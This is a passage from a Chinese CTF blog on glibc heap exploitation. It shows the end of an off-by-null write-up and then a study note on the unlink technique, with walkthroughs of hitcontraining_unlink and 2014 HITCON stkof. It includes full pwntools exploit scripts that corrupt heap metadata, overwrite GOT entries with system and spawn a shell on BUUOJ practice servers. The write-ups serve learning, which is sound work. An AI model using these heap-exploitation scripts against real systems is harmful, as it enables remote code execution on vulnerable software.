<p>PS:用户堆块我指的是自己申请的堆块，指针堆块是程序自己申请的那个堆块</p>
</blockquote>
<p><img src="/../img/image-20221007205244060.png" alt="image-20221007205244060"></p>
<p>然后申请一个0x38大小的堆块，就造成了堆块重叠。然后思路就是往用户堆块写入数据，覆写指针堆块里的指针将其改完free函数的got表，然后进行泄露得到libc地址。然后再用edit函数覆写edit函数的got表为system的地址，最后释放掉一个存有&#x2F;bin&#x2F;sh字符串的堆块即可获取shell、。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">     </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400E9f)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(free_got_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;free_addr&#x27;</span>)</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;free&#x27;,free_addr,libc)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x400D81)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007205307506.png" alt="image-20221007205307506"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>off_by_null</tag>
      </tags>
  </entry>
  <entry>
    <title>关于unlink的学习总结</title>
    <url>/posts/afa5cfa3.html</url>
    <content><![CDATA[<p>关于unlink的学习总结，<strong>我打算分成4个部分来说明，分别是unlink的利用整体思路、如何伪造fake_chunk、探究下unlink漏洞是如何实现的、相关题目的WP</strong>。我这篇博客并没有画图片来说明unlink的操作，我认为不是特别适合完全不懂unlink的师傅来参考学习，建议去看一些其他师傅一些画图说明unlink的博客，对unlink有个模糊的认识后，再看这篇文章应该效果最好</p>
<span id="more"></span>

<h2 id="对unlink的总结："><a href="#对unlink的总结：" class="headerlink" title="对unlink的总结："></a>对unlink的总结：</h2><p>1、unlink的整体利用思路为</p>
<p>①、利用溢出伪造fake_chunk</p>
<p>②、free掉引线堆块（也就是被溢出修改prev_size和size的chunk），从而触发unlink（注意chunk别跟top chunk合并了），同时引线堆块的大小一定要大于等于0x80，避免被free掉给放进了fastbin中。</p>
<p>③、最后效果为fake_chunk的地址改为&amp;P-0x18 </p>
<p>④、通过edit功能修改bss段存放的chunk信息，进行泄露函数真实地址以及篡改函数的got表，从而获取shell。</p>
<p>2、fake_chunk未必非要和引线堆块相邻，只要让引线堆块的地址减去自身的prev_size可以找到fake_chunk即可</p>
<blockquote>
<p>什么时候考虑unlink？ 目前以我做题的情况来看，通常不开PIE，并且存在堆溢出的时候，是可以考虑unlink的。</p>
</blockquote>
<h2 id="构造fake-chunk"><a href="#构造fake-chunk" class="headerlink" title="构造fake_chunk"></a>构造fake_chunk</h2><p>利用unlink之前，要构造好fake_chunk（这个chunk并不是申请出来的，而是写入精心构造的数据伪造的chunk）为之后的unlink做铺垫，这个fake_chunk有三个关键部分。</p>
<p>第一、fake_chunk需要伪造自己的prev_size和size（这个prev_size填充成0即可），size位最小为0x20（因为要装fd和bk还要溢出下个chunk的prev_size和size）同时size需要与下一个chunk的prev_size位保持一致（PREV_INUSE位最好为1)。</p>
<p>第二、fake_chunk(这个fake_chunk要构造成释放状态的,这样fd和bk才有意义)的fd和bk设置成&amp;fake_chunk-0x18和&amp;fake_chunk-0x10。（这里指的&amp;fake_chunk,就是bss段上存放chunk的地址）</p>
<p>第三、要将下一个chunk(相当于写入数据的chunk来说，我习惯将高地址的chunk称为下)的prev_size和size进行溢出修改，prev_size要修改为fake_chunk的大小（如果fake_chunk没有和下一个chunk相邻，那么需要保证下一个chunk的地址减去prev_size的值，正好可以找到fake_chunk），而size就是写成原本这个chunk的大小，但是PREV_INUSE位要改写成0（用来声明上一个堆块是free状态）。</p>
<p>然后free掉高地址的chunk，此时程序检测到了这个堆块的PREV_INUSE为0，就会认为上一个堆块处于free状态，然后就会触发unlink将高地址的chunk和上一个chunk合并，<strong>它怎么去找到上一个chunk的起始位置呢？它会用当前chunk的地址减去prev_size的大小找到上一个chunk的位置，但是prev_size已经被修改成了fake_size的大小，因此当前chunk的地址减去prev_size大小误把fake_chunk当做了上一个chunk</strong>，然后进行unlink操作。</p>
<h2 id="探究unlink漏洞是如何产生的"><a href="#探究unlink漏洞是如何产生的" class="headerlink" title="探究unlink漏洞是如何产生的"></a>探究unlink漏洞是如何产生的</h2><p>下面是unlink的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后下面是将源码的关键部分提取出来了</p>
<p>unlink宏的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br></pre></td></tr></table></figure>

<p>unlink中上来直接执行的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;								      </span><br><span class="line">BK = P-&gt;bk;	</span><br></pre></td></tr></table></figure>

<p>if要检查（满足下面的条件，则可以通过if）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk == P || BK-&gt;fd == P</span><br></pre></td></tr></table></figure>

<p>通过检查后，执行的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>程序是怎么找到fd和bk指针的？ 答：靠偏移，而这就给了我们伪造fd和bk的机会</p>
</blockquote>
<p>以 <code>FD-&gt;bk ==P</code>为例(64位程序），它就等价于*(FD+0x18)&#x3D;&#x3D;P  (<strong>请注意这里是存在*()的，这里不明白的可以去学习一下C语言的指针</strong>) (0x18是因为bk指针距离堆块的起始地址有三个内存单元大小的偏移，64位程序中内存单元的大小为0x8)</p>
<blockquote>
<p>因为FD&#x3D;P-&gt;fd，如果我们可以通过溢出来控制P-&gt;fd，就意味着我们控制了FD的值，考虑一下FD的值应该是什么，才能满足这个等式<code>*(FD+0x18)==P</code> </p>
<p>答案是 FD应该为 <code>&amp;P-0x18</code> 才能满足上述等式，代换进去的式子就是这个   *(&amp;P+0x18-0x18)&#x3D;&#x3D;P  ，因此通过了检查</p>
</blockquote>
<p>以此类推，我们让BK的值写成&amp;P-0x10，也就可以绕过检查。</p>
<p>先捋一下，我们现在是利用溢出的方式将P-&gt;fd (也就是FD) 和P-&gt;bk (也就是BK)分别修改为了 <code>&amp;P-0x18</code> 和 <code>&amp;P-0x10</code>  ,而我们刚刚通过了if的检查，因此现在 <code>FD-&gt;bk ==P</code> <code> BK-&gt;fd == P</code>(接下来要进行等量代换，因此这些值要记住)</p>
<p>接下来执行的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<p>将刚刚说过的值进行等量代换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=BK &lt;==&gt; P=&amp;P<span class="number">-0x10</span></span><br><span class="line">BK-&gt;fd=FD &lt;==&gt; P=&amp;P<span class="number">-0x18</span></span><br></pre></td></tr></table></figure>

<p>因为是先执行FD-&gt;bk&#x3D;BK 后执行的BK-&gt;fd&#x3D;FD，也就是等同于先执行的P&#x3D;&amp;P-0x10，后执行的P&#x3D;&amp;P-0x18。 <strong>所以最后P的值等于&amp;p-0x18</strong></p>
<p>&amp;P是啥？它是P的地址，因此&amp;P指向了P。</p>
<p><img src="/../img/2706180-20220625220421408-1786229210.png"></p>
<p>我们在bss段发现了&amp;P （0x1cf9030是P）</p>
<p>补充：由于bss段上记录了申请的chunk所在的位置，换句话说，我们申请的chunk在哪，是由bss段上记录的信息说了算。bss段是怎么记录信息的？就是用指针的方式来记录的，bss段中的内存单元中存放的就是chunk的地址，也就是说bss段上某个地址指向了申请chunk的地址（这里指的是chunk的用户地址）。</p>
<p>最后用两句话来说一下利用unlink漏洞的条件和unlink漏洞产生的效果。</p>
<blockquote>
<p>利用条件：利用溢出伪造一个fake_chunk，然后free掉高地址的那个堆块，触发unlink</p>
<p>利用后效果：最后将fake_chunk的地址（也就是P的值）修改为&amp;P-0x18，之后再往P写入数据，就可以修改bss段上存储的chunk信息了。</p>
</blockquote>
<h2 id="实战unlink"><a href="#实战unlink" class="headerlink" title="实战unlink"></a>实战unlink</h2><h3 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220625220447316-229285179.png"></p>
<h4 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h4><p>2.23的libc，如果不想手动patch libc的话，可以试试我写的小工具 <a href="https://www.cnblogs.com/ZIKH26/articles/16243431.html">patchtup</a>。它可以自动patch 指定的libc。（效果如下）<br><img src="/../img/2706180-20220625220544926-1942268274.png"></p>
<p>一个菜单题，同时发现了后门。<br><img src="/../img/2706180-20220625220718870-1959637132.png"></p>
<p>不过根据以往的情况来看，在buu上的题目flag应该不会在这个位置，但总要尝试一下的。</p>
<p>程序的漏洞点在change_item函数里面，发现没有对写入数据的大小做检查，导致了此处可以溢出。</p>
<p><img src="/../img/2706180-20220625220754639-1966501539.png"></p>
<p>同时还发现了个函数指针，下面是它被调用的地方。</p>
<p><img src="/../img/2706180-20220625220844769-1910492971.png"></p>
<p>而这个指针定义在这里（下图），好巧不巧，这个指针又存在一个程序自己分配的堆块上。</p>
<p><img src="/../img/2706180-20220625221003445-87496987.png"></p>
<h4 id="大致思路（没用unlink的方法）："><a href="#大致思路（没用unlink的方法）：" class="headerlink" title="大致思路（没用unlink的方法）："></a>大致思路（没用unlink的方法）：</h4><p>考虑到有后门函数，同时没开PIE，这个后门函数是可以直接用的，这道题是2.23的libc，因此free掉的小堆块直接进fastbin里了。思路也比较简单，利用溢出篡改fd指针，将fd指针改成程序刚开始申请的chunk地址（这个chunk是存放的函数指针），再将这个堆块申请过来，此时我们就可以对这个堆块进行编辑了，直接篡改函数指针为后门函数的地址。最后选择5，执行一下后门函数即可</p>
<p>不过最后打远程的时候，flag确实不在那个位置。我在本地建了个flag文件，确实是可以读出来信息的。</p>
<p><img src="/../img/2706180-20220625221102782-492232474.png"></p>
<h4 id="使用后门函数的exp"><a href="#使用后门函数的exp" class="headerlink" title="使用后门函数的exp"></a>使用后门函数的exp</h4><p>这个的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x400A6F\nb *0x400CDD\nc&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;下面这三行代码是我用来tmux分三屏的，不需要的话注释即可&quot;&quot;&quot;</span></span><br><span class="line">os.system(<span class="string">&#x27;tmux select-pane -L&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux split-window&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux set mouse on&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400D49</span></span><br><span class="line">payload1=p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)<span class="comment">#添加0x21的目的是为了通过fastbin中的检查</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">change(<span class="string">&#x27;0&#x27;</span>,<span class="number">0x20</span>,payload1)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面这个思路非常简单，简单到我这个刚刚接触堆的菜鸡都感觉没必要写过程了，我就简单记录下我当时思考的三个“蠢”问题吧。</p>
<blockquote>
<p>最开始的存放函数指针的堆块已经存在了，为什么要再把这个堆块申请一次？</p>
<p>答：因为最开始这个堆块并不在记录的堆块索引中，换句话说我们无法去编辑这个堆块（因为没有它的索引），但是我们申请的堆块是都有索引的，因此需要再把存在函数指针的堆块申请一次。</p>
</blockquote>
<blockquote>
<p>为啥不能直接把fd指针改成后门函数的地址，然后直接申请回来？</p>
<p>第一没意义，第二malloc从fastbin中申请的堆块会进行一个检查（判断我们需要堆块的大小是否等于该fastbin中的堆块大小），这个检查过不了，因为fastbin这个里面的chunk是通过修改fd指针来伪造的，取对应size的时候肯定是有问题的</p>
</blockquote>
<blockquote>
<p>咋把fd指针改成第一个chunk的地址？</p>
<p>先申请三个堆块，把第一个堆块（是我们主动申请的第一个堆块，不是程序自己申请的堆块）当作溢出堆块，然后分别释放第二个堆块和第三个堆块，从而让fastbin中出现两个空闲堆块，此时的第二个堆块的fd指针指向了第三个堆块的地址。最后发现每次程序自己申请的那个堆块末尾都是00，因此我们只需要把第二个堆块的fd指针末尾写成00即可。考虑到程序会在我们输入的末尾加个00，因此我们只需要写入0x20字节的数据（用send发送），00自动就写入进去了。</p>
</blockquote>
<h4 id="大致思路（使用unlink"><a href="#大致思路（使用unlink" class="headerlink" title="大致思路（使用unlink)"></a>大致思路（使用unlink)</h4><p>在show函数中，printf %s打印的信息是bss段存放的地址所指向的数据。可是现在我们已经可以去修改bss段存放的地址了，那只需要让bss段上存一个函数的got表，那么执行show即可进行泄露函数的真实地址。</p>
<p><img src="/../img/2706180-20220625221127777-789320050.png"></p>
<p>在change函数中，read写入的是bss段存放的地址所指向的信息，我们已经可以去修改bss段存放的地址，因此在bss段上存一个函数的got表，那么在执行change的时候，就可以修改函数的got表。</p>
<p><img src="/../img/2706180-20220625221256721-137146817.png"></p>
<p>最终这道题的思路就是伪造一个fake_chunk，然后free掉一个堆块，触发unlink与fake_chunk合并，让fake_chunk的地址改为&amp;p-0x18，此时往fake_chunk中写入数据，就相当于往bss段上写入数据，进行篡改bss段存放的chunk信息（写入atoi函数的got表覆盖第1个chunk的地址），然后执行show函数泄露atoi的真实地址，再执行change函数，修改atoi函数的got表为system地址，最后输入&#x2F;bin&#x2F;sh获取shell。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p>直接用下面这个脚本是打不通的，我自己写了个tools模块，使用了里面自己定义的函数，如果想使用下面脚本的话可以在<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里</a>获取tools的源码，然后创建一个名为tools的py文件，或者删去我自定义的函数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27507</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400C27,0x400CDD)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbbbbb&#x27;</span>)<span class="comment">#为什么要申请一个0x80大小的chunk?因为如果小于了0x80的chunk，free掉后会进入fastbin，而fastbin中是不会进行合并操作的。申请0x80再加上0x10的头部free掉后就可以到unsortedbin</span></span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span> <span class="comment">#这个地址为写入数据的chunk的地址</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi_addr&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;atoi&#x27;,atoi_addr,libc)</span></span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(sys_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220625221316198-16141362.png"></p>
<h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><p>这道题跟hitcontraining_unlink题目都是一样的手法，利用unlink达到修改函数got表的目的。唯一的区别就是这道题没有%s寻址泄露，也就是无法将got表写到chunk地址（bss段记录chunk信息的位置）执行打印函数进行泄露。所以需要先劫持free函数的got表为puts函数的plt表，然后再将chunk地址改为puts的got地址，free掉改为puts的got地址那个堆块，即可进行泄露。</p>
<p>下面简单分析一下这道题，首先这道题是没有菜单的，根据里面的功能自己找一下就行了。</p>
<p><img src="/../img/2706180-20220625221844974-83069417.png"></p>
<p>这道题有个点是以前不知道的。一般的题目都会使用setbuf关闭缓冲区，但是这道题没有使用setbuf关闭缓冲区，然后使用printf和fgets的时候发现他们也各自申请了一个堆块。为了探究原因si进去单步调试了一下，发现是调用了_IO_file_doallocate函数，然后这个函数调用了malloc。_IO_file_doallocate的作用是分配输入缓冲区。因此原因为printf先将数据输出到缓冲区中，由于最开始没有缓冲区，因此需要使用malloc进行申请。将数据先存放到这个刚申请的缓冲区里，等碰见fflush函数再进行输出。</p>
